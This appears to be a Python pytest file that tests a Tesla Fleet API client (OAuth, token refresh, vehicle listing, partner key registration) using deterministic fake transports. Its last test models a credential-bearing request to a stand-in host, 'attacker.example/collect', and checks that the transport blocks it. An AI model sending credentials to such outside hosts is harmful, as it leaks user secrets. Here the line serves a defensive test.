"""Tesla onboarding client tests with deterministic HTTP fakes."""

import json
from collections import deque
from datetime import UTC
from urllib.parse import parse_qs, urlsplit

import pytest
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from tesla_personal_platform.tesla_client import (
    PartnerRegistrar,
    TeslaAPIError,
    TeslaAuthenticationError,
    TeslaConfigurationError,
    TeslaFleetClient,
    TeslaOAuthClient,
    TeslaOAuthConfig,
    TeslaReauthorizationRequired,
    UrllibTransport,
)
from tesla_personal_platform.tesla_client.transport import HttpResponse

NA_BASE = "https://fleet-api.prd.na.vn.cloud.tesla.com"
PUBLIC_KEY_HEX = (
    "046b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"
    "4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"
)
PUBLIC_KEY = (
    ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), bytes.fromhex(PUBLIC_KEY_HEX))
    .public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    .decode("ascii")
)


class RecordingTransport:
    def __init__(self, responses: list[HttpResponse]) -> None:
        self.responses = deque(responses)
        self.requests: list[tuple[str, str, dict[str, object]]] = []

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        form: dict[str, str] | None = None,
        json_body: object | None = None,
    ) -> HttpResponse:
        self.requests.append(
            (method, url, {"headers": headers, "form": form, "json_body": json_body})
        )
        return self.responses.popleft()


def response(status: int, document: object) -> HttpResponse:
    return HttpResponse(status, json.dumps(document).encode("utf-8"), "application/json")


class RecordingIDTokenVerifier:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str, str]] = []

    def verify(self, token: str, *, nonce: str, audience: str) -> str:
        self.calls.append((token, nonce, audience))
        if nonce != "expected-nonce":
            raise TeslaAuthenticationError("nonce mismatch")
        return "tesla-subject"


def oauth_client(
    transport: RecordingTransport, verifier: RecordingIDTokenVerifier | None = None
) -> TeslaOAuthClient:
    return TeslaOAuthClient(
        TeslaOAuthConfig(
            "client-id",
            "client-secret",
            "https://woodhouse.derekjass.com/oauth/callback",
            NA_BASE,
        ),
        transport,
        verifier or RecordingIDTokenVerifier(),
    )


def test_authorization_url_has_required_state_nonce_and_scopes() -> None:
    client = oauth_client(RecordingTransport([]))
    query = parse_qs(urlsplit(client.authorization_url(state="state", nonce="nonce")).query)

    assert query["response_type"] == ["code"]
    assert query["state"] == ["state"]
    assert query["nonce"] == ["nonce"]
    assert query["require_requested_scopes"] == ["true"]
    assert query["show_keypair_step"] == ["true"]
    assert query["scope"] == [
        "openid offline_access vehicle_device_data vehicle_location vehicle_cmds "
        "vehicle_charging_cmds"
    ]
    assert "code_challenge" not in query


def test_code_exchange_validates_nonce_and_does_not_expose_secret_in_repr() -> None:
    transport = RecordingTransport(
        [
            response(
                200,
                {
                    "access_token": "access-token",
                    "refresh_token": "refresh-token",
                    "id_token": "id-token",
                    "expires_in": 3600,
                    "scope": "openid offline_access vehicle_device_data",
                },
            )
        ]
    )
    verifier = RecordingIDTokenVerifier()
    client = oauth_client(transport, verifier)

    tokens = client.exchange_code("code", nonce="expected-nonce")

    assert tokens.expires_at.tzinfo == UTC
    assert verifier.calls == [("id-token", "expected-nonce", "client-id")]
    form = transport.requests[0][2]["form"]
    assert isinstance(form, dict) and form["client_secret"] == "client-secret"
    assert "client-secret" not in repr(client.config)


def test_code_exchange_rejects_nonce_failure() -> None:
    transport = RecordingTransport(
        [
            response(
                200,
                {
                    "access_token": "access-token",
                    "refresh_token": "refresh-token",
                    "id_token": "id-token",
                    "expires_in": 3600,
                },
            )
        ]
    )
    with pytest.raises(TeslaAuthenticationError, match="nonce"):
        oauth_client(transport).exchange_code("code", nonce="wrong-nonce")


def test_refresh_requires_and_returns_replacement_refresh_token() -> None:
    transport = RecordingTransport(
        [
            response(
                200,
                {
                    "access_token": "new-access",
                    "refresh_token": "new-refresh",
                    "expires_in": 3600,
                },
            )
        ]
    )
    tokens = oauth_client(transport).refresh("old-refresh", tesla_subject="tesla-subject")

    form = transport.requests[0][2]["form"]
    assert isinstance(form, dict)
    assert form == {
        "grant_type": "refresh_token",
        "client_id": "client-id",
        "refresh_token": "old-refresh",
    }
    assert tokens.refresh_token == "new-refresh"


def test_login_required_is_a_reauthorization_failure() -> None:
    transport = RecordingTransport([response(401, {"error": "login_required"})])
    with pytest.raises(TeslaReauthorizationRequired):
        oauth_client(transport).refresh("expired", tesla_subject="tesla-subject")


def test_vehicle_list_paginates_and_fleet_status_is_per_vin() -> None:
    transport = RecordingTransport(
        [
            response(
                200,
                {
                    "response": [{"vin": "VIN1", "id_s": "1", "display_name": "One"}],
                    "pagination": {"next": 2},
                },
            ),
            response(
                200,
                {
                    "response": [{"vin": "VIN2", "id": 2, "state": "asleep"}],
                    "pagination": {"next": None},
                },
            ),
            response(
                200,
                {
                    "response": {
                        "key_paired_vins": ["VIN1"],
                        "unpaired_vins": ["VIN2"],
                        "vehicle_info": {
                            "VIN1": {
                                "vehicle_command_protocol_required": True,
                                "total_number_of_keys": 3,
                            },
                            "VIN2": {
                                "vehicle_command_protocol_required": True,
                            },
                        },
                    }
                },
            ),
        ]
    )
    client = TeslaFleetClient(transport)

    vehicles = client.list_vehicles("access", base_url=NA_BASE)
    statuses = client.fleet_status(
        "access", base_url=NA_BASE, vins=[vehicle.vin for vehicle in vehicles]
    )

    assert [vehicle.vin for vehicle in vehicles] == ["VIN1", "VIN2"]
    assert statuses["VIN1"].key_paired is True
    assert statuses["VIN2"].key_paired is False
    assert statuses["VIN1"].total_number_of_keys == 3
    assert statuses["VIN2"].vehicle_command_protocol_required is True
    assert transport.requests[2][2]["json_body"] == {"vins": ["VIN1", "VIN2"]}


def test_fleet_status_rejects_missing_vehicle_info_wrapper() -> None:
    client = TeslaFleetClient(
        RecordingTransport([response(200, {"response": {"key_paired_vins": ["VIN1"]}})])
    )

    with pytest.raises(TeslaAPIError) as caught:
        client.fleet_status("access", base_url=NA_BASE, vins=["VIN1"])

    assert caught.value.category == "invalid_payload"


def test_fleet_status_keeps_pairing_unknown_when_lists_omit_vehicle() -> None:
    client = TeslaFleetClient(
        RecordingTransport(
            [
                response(
                    200,
                    {
                        "response": {
                            "key_paired_vins": [],
                            "unpaired_vins": [],
                            "vehicle_info": {"VIN1": {}},
                        }
                    },
                )
            ]
        )
    )

    statuses = client.fleet_status("access", base_url=NA_BASE, vins=["VIN1"])

    assert statuses["VIN1"].key_paired is None


def test_fleet_http_error_retains_only_safe_diagnostic_metadata() -> None:
    client = TeslaFleetClient(RecordingTransport([response(403, {"error": "forbidden"})]))

    with pytest.raises(TeslaAPIError) as caught:
        client.fleet_status("access", base_url=NA_BASE, vins=["VIN1"])

    assert caught.value.category == "http_error"
    assert caught.value.status_code == 403
    assert "forbidden" not in str(caught.value)


def test_partner_registration_is_idempotent_when_expected_key_exists() -> None:
    transport = RecordingTransport(
        [
            response(200, {"access_token": "partner-token"}),
            response(409, {"error": "already_registered"}),
            response(200, {"response": {"public_key": PUBLIC_KEY_HEX}}),
        ]
    )
    results = PartnerRegistrar(transport).ensure_registered(
        client_id="client",
        client_secret="secret",
        domain="woodhouse.derekjass.com",
        expected_public_key_pem=PUBLIC_KEY,
        base_urls=[NA_BASE],
    )

    assert results[0].status == "already_registered"
    assert [request[0] for request in transport.requests] == ["POST", "POST", "GET"]


@pytest.mark.parametrize("domain", ["woodhouse.example?unexpected=true", "bad host.example"])
def test_partner_registration_rejects_non_hostname_domain(domain: str) -> None:
    with pytest.raises(TeslaConfigurationError, match="bare hostname"):
        PartnerRegistrar(RecordingTransport([])).ensure_registered(
            client_id="client",
            client_secret="secret",
            domain=domain,
            expected_public_key_pem=PUBLIC_KEY,
            base_urls=[NA_BASE],
        )


def test_partner_registration_wraps_unsupported_pem_algorithm(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def raise_unsupported_algorithm(_: bytes) -> object:
        raise UnsupportedAlgorithm("unsupported test algorithm")

    monkeypatch.setattr(serialization, "load_pem_public_key", raise_unsupported_algorithm)

    with pytest.raises(
        TeslaConfigurationError,
        match="Expected a secp256r1 public key in PEM or uncompressed-point hex",
    ):
        PartnerRegistrar(RecordingTransport([])).ensure_registered(
            client_id="client",
            client_secret="secret",
            domain="woodhouse.derekjass.com",
            expected_public_key_pem=PUBLIC_KEY,
            base_urls=[NA_BASE],
        )


def test_partner_registration_creates_missing_record_then_verifies() -> None:
    transport = RecordingTransport(
        [
            response(200, {"access_token": "partner-token"}),
            response(200, {"response": {}}),
            response(200, {"response": {"public_key": PUBLIC_KEY_HEX}}),
        ]
    )
    results = PartnerRegistrar(transport).ensure_registered(
        client_id="client",
        client_secret="secret",
        domain="woodhouse.derekjass.com",
        expected_public_key_pem=PUBLIC_KEY,
        base_urls=[NA_BASE],
    )

    assert results[0].status == "registered"
    assert transport.requests[1][2]["json_body"] == {"domain": "woodhouse.derekjass.com"}
    assert [request[0] for request in transport.requests] == ["POST", "POST", "GET"]


def test_production_transport_rejects_non_tesla_hosts_before_network() -> None:
    with pytest.raises(ValueError, match="approved Tesla HTTPS host"):
        UrllibTransport().request(
            "GET",
            "https://attacker.example/collect",
            headers={"Authorization": "Bearer credential"},
        )
